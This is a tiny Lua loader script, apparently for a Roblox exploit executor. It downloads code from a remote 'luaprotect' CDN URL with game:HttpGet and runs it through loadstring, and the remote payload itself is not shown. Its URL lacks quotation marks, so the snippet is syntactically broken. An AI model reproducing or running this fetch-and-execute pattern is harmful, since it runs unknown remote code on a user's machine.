local source = game:HttpGet(https://cdn.luaprotect.dev/u/8d9aa2/KjxGj-E0uqDEY-V8)
local execute, err = loadstring(source)

if not execute then
    error(err)
end

execute()
